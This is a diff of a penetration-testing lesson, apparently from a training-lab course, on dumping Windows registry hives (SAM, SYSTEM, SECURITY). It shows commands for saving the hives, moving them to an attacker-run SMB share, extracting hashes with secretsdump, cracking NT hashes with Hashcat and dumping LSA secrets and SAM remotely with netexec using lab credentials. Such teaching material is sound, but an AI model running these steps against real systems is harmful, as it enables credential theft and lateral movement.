@@ -15,7 +15,7 @@ We can back up these hives using the `reg.exe` utility.
 
 By launching `cmd.exe` with administrative privileges, we can use `reg.exe` to save copies of the registry hives. Run the following commands:
 
-```
+```PowerShell
 C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
 
 The operation completed successfully.
@@ -36,7 +36,7 @@ If we're only interested in dumping the hashes of local users, we need only `HK
 
 To create the share, we simply run `smbserver.py -smb2support`, specify a name for the share (e.g., `CompData`), and point to the local directory on our attack host where the hive copies will be stored (e.g., `/home/ltnbob/Documents`). The `-smb2support` flag ensures compatibility with newer versions of SMB. If we do not include this flag, newer Windows systems may fail to connect to the share, as SMBv1 is disabled by default due to [numerous severe vulnerabilities](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=smbv1) and publicly available exploits.
 
-```
+```Bash
 tylapcheong@htb[/htb]$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
 ```
 
@@ -44,7 +44,7 @@ Once the share is running on our attack host, we can use the `move` command on
 
 #### Moving hive copies to share
 
-```
+```PowerShell
 C:\> move sam.save \\10.10.15.16\CompData
         1 file(s) moved.
 
@@ -56,7 +56,7 @@ C:\> move system.save \\10.10.15.16\CompData
 ```
 
 We can then confirm that our hive copies were successfully moved to the share by navigating to the shared directory on our attack host and using ls to list the files.
-```
+```Bash
 tylapcheong@htb[/htb]$ ls
 sam.save  security.save  system.save
 ```
@@ -64,12 +64,14 @@ sam.save  security.save  system.save
 
 One particularly useful tool for dumping hashes offline is Impacket's `secretsdump`. Impacket is included in most modern penetration testing distributions. To check if it is installed on a Linux based system, we can use the `locate` command:
 
-`tylapcheong@htb[/htb]$ locate secretsdump`
+```bash
+tylapcheong@htb[/htb]$ locate secretsdump
+```
 
 
 Using secretsdump is straightforward. We simply run the script with Python and specify each of the hive files we retrieved from the target host.
 
-```
+```bash
 tylapcheong@htb[/htb]$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
 ```
 
@@ -86,8 +88,7 @@ Once we have the hashes, we can begin cracking them using [Hashcat](https://has
 
 As mentioned earlier, we can populate a text file with the NT hashes we were able to dump.
 
-```
-shellsession
+```bash
 tylapcheong@htb[/htb]$ sudo vim hashestocrack.txt
 
 64f12cddaa88057e06a81b54e73b949b
@@ -102,7 +103,7 @@ Now that the NT hashes are in our text file (`hashestocrack.txt`), we can use Ha
 
 Covering all available modes is beyond the scope of this module, so we will focus on using the `-m` option to specify hash type `1000`, which corresponds to NT hashes (also known as NTLM-based hashes). For a full list of supported hash types and their associated mode numbers, we can refer to Hashcat's [wiki page](https://hashcat.net/wiki/doku.php?id=example_hashes) or consult the man page.
 
-```
+```bash
 tylapcheong@htb[/htb]$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
 ```
 We can see from the output that Hashcat was successful in cracking three of the hashes. Having these passwords can be useful in many ways. For example, we could attempt to use the cracked credentials to access other systems on the network. It is very common for users to reuse passwords across different work and personal accounts.
@@ -110,7 +111,9 @@ We can see from the output that Hashcat was successful in cracking three of the 
 ## DCC2 hashes
 
 As mentioned previously, `hklm\security` contains cached domain logon information, specifically in the form of DCC2 hashes. These are local, hashed copies of network credential hashes. An example is:
-`inlanefreight.local/Administrator:$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25`
+```
+inlanefreight.local/Administrator:$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25
+```
 
 This type of hash is much more difficult to crack than an NT hash, as it uses PBKDF2. Additionally, it cannot be used for lateral movement with techniques like Pass-the-Hash (which we will cover later). The Hashcat mode for cracking DCC2 hashes is `2100`.
 
@@ -153,10 +156,11 @@ With access to credentials that have `local administrator privileges`, it is al
 
 #### Dumping LSA secrets remotely
 
-`tylapcheong@htb[/htb]$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa`
+```
+tylapcheong@htb[/htb]$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
+```
 
 #### Dumping SAM Remotely
-
 Similarly, we can use netexec to dump hashes from the SAM database remotely.
 ```
 tylapcheong@htb[/htb]$ netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
